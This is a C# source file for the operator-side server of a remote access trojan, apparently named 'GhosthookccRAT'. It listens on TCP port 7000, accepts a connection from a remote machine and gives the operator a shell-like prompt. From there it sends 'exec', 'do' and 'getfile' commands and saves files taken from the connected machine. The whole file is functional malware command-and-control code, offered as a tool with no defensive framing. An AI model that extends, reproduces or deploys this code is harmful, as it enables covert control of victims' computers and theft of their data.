using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using color;
using System.Text.RegularExpressions;
using System.IO;

namespace GhosthookccRAT
{
    public class Socket_Operations
    {
        public ColorScript color = new ColorScript();
        public async Task ReceivePackets(Socket conn, byte[] buffer)
        {
            Array.Clear(buffer, 0, buffer.Length);
            string data = null;

            await conn.ReceiveAsync(buffer, SocketFlags.None);

            Regex findfilestart = new Regex(@"<(.*?)>");

            data = Encoding.ASCII.GetString(buffer).Replace("\0", "");

            var totallength = 0;

            string filetype = null;
            string filename = null;
            string encoding = null;

            long filesize = 0;

            Encoding newencoding = null;

            if (data.StartsWith("type<"))
            {

                MatchCollection fileinfo = findfilestart.Matches(data);

                totallength += fileinfo[0].Groups[1].Value.Length;
                totallength += fileinfo[1].Groups[1].Value.Length;
                totallength += fileinfo[2].Groups[1].Value.Length;
                totallength += fileinfo[3].Groups[1].Value.Length;
                

                filetype = fileinfo[0].Groups[1].Value;
                filename = fileinfo[1].Groups[1].Value;
                encoding = fileinfo[2].Groups[1].Value;

                long.TryParse(fileinfo[3].Groups[1].Value, out filesize);

                if (encoding == "UTF7")
                {
                    newencoding = Encoding.UTF7;
                } 
                else if (encoding == "UTF8") 
                {
                    newencoding = Encoding.UTF8;
                }
                else if (encoding == "UTF32")
                {
                    newencoding = Encoding.UTF32;
                } 
                else if (encoding == "Unicode")
                {
                    newencoding = Encoding.Unicode;
                } 
                else if (encoding == "BigEndianUnicode")
                {
                    newencoding = Encoding.BigEndianUnicode;
                }
                else if (encoding == "UTF32BE")
                {
                    newencoding = new UTF32Encoding(true, true);
                } 
                else
                {
                    newencoding = Encoding.ASCII;
                }

                // Console.WriteLine(filesize);

                /*
                Console.WriteLine("\nFILETYPE : " + filetype);
                Console.WriteLine("FILENAME : " + filename);
                Console.WriteLine("FILESIZE : " + filesize);
                */
            }

            if (data == "command not recognized!")
            {
                color.colored_print("\n" + data + "\n", "Red", "Black", true, false);
            }
            else
            {
                if (filesize > 0)
                {
                    Array.Clear(buffer, 0, totallength);

                    FileStream newfile = File.Create(filename);
                    BinaryWriter newStreamWriter = new BinaryWriter(newfile);

                    Console.WriteLine(buffer[0]);

                    long bytesRead = 0;

                    data = newencoding.GetString(buffer);

                    newStreamWriter.Write(data);

                    bytesRead += buffer.Length;

                    data = "";

                    while (bytesRead < filesize) 
                    {
                        await conn.ReceiveAsync(buffer, SocketFlags.None);

                        data = newencoding.GetString(buffer);

                        // Console.Write(data);

                        newStreamWriter.Write(data);


                        Console.WriteLine("BEFORE :: " + bytesRead);
                        bytesRead += data.Length;
                        Console.WriteLine("AFTER :: " + bytesRead);
                        Array.Clear(buffer, 0, buffer.Length);
                    }

                    newStreamWriter.Close();
                    newfile.Close();
                }
                else
                {
                    Array.Clear(buffer, 0, buffer.Length);
                    while (true)
                    {
                        while (conn.Available > 0)
                        {
                            await conn.ReceiveAsync(buffer, SocketFlags.None);

                            data += Encoding.ASCII.GetString(buffer).Replace("\0", "");

                            Array.Clear(buffer, 0, buffer.Length);
                        }
                        break;
                    }
                    color.colored_print("\n" + data + "\n", "Green", "Black", true, false);
                }

                //color.colored_print("\n" + $"LENGTH : {data.Length} -- " + data + "\n\n", "Green", "Black", true);
            }

            Array.Clear(buffer, 0, buffer.Length);
        }

        public async Task SendPackets(string input, Socket conn, byte[] buffer, bool waitResponse)
        {
            if (waitResponse == true)
            {
                await conn.SendAsync(Encoding.ASCII.GetBytes(input + "REPLY"), SocketFlags.None);
                await ReceivePackets(conn, buffer);
            }
            else
            {
                await conn.SendAsync(Encoding.ASCII.GetBytes(input + "NOREPLY"), SocketFlags.None);
            }
        }

        public async Task<string> GetPath(Socket conn, byte[] buffer)
        {
            await conn.SendAsync(Encoding.ASCII.GetBytes("WHEREAMI"), SocketFlags.None);
            await conn.ReceiveAsync(buffer, SocketFlags.None);

            var pathVar = Encoding.ASCII.GetString(buffer).Replace("\0", "");
            return pathVar;
        }

        public async Task Handle()
        {
            string[] commands = new string[]
            {
                "exec",
                "do",
                "getfile"
            };

            bool[] commandsInfo = new bool[]
            {
                true,
                false,
                true
            };

            const int BUFFER_SIZE = 1024;
            byte[] buffer = new byte[BUFFER_SIZE];

            IPAddress ip = IPAddress.Any;
            IPEndPoint RemoteEP = new IPEndPoint(ip, 7000);

            Socket handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            color.colored_print("===========================================", "DarkCyan", "Black", true, false);
            color.colored_print($"Binding to {RemoteEP.ToString()}.../////////////////", "Yellow", "Black", true, false);

            handle.Bind(RemoteEP);
            handle.Listen(10);

            Task<Socket> connTask = handle.AcceptAsync();
            Socket conn = connTask.Result;

            color.colored_print("===========================================", "DarkCyan", "Black", true, false);
            color.colored_print($"Connection Received from { conn.RemoteEndPoint.ToString() }", "Yellow", "Black", true, false);
            color.colored_print("===========================================\n", "DarkCyan", "Black", true, false);

            //Console.Clear();

            //Image logo = Image.FromFile("logo4.png");
            //Console.WriteLine(color.GrayscaleImageToASCII(logo));

            color.banner_print();

            // Task RecvTask = Task.Run(() => ReceivePackets(conn, buffer));
            await SendPackets("STARTPACKET", conn, buffer, true);

            while (true)
            {
                string newPathVar = await GetPath(conn, buffer);
                color.colored_print($"{newPathVar} $>\t", "Magenta", "Black", false, false);

                color.changeForeground("DarkYellow");

                string inData = Console.ReadLine();

                color.Reset();

                try
                {
                    if (inData == "clear" || inData == "cls")
                    {
                        Console.Clear();
                    }

                    else if (inData.Length > 0)
                    {
                        for (int i = 0; i < commands.Length; i++)
                        {
                            if (inData.StartsWith(commands[i]))
                            {
                                await SendPackets(inData, conn, buffer, commandsInfo[i]);
                            }
                        }
                    }
                    else if (inData.Length == 0)
                    {
                        color.colored_print("\n[-] Input is empty!\n", "Red", "Black", true, false);
                    }
                }
                catch (Exception errno) { color.colored_print(errno.ToString(), "Red", "Black", true, false); }
            }
        }
    }
    class Server
    {
        static async Task Main(string[] args)
        {
            Socket_Operations sockHandle = new Socket_Operations();
            await sockHandle.Handle();
        }
    }
}
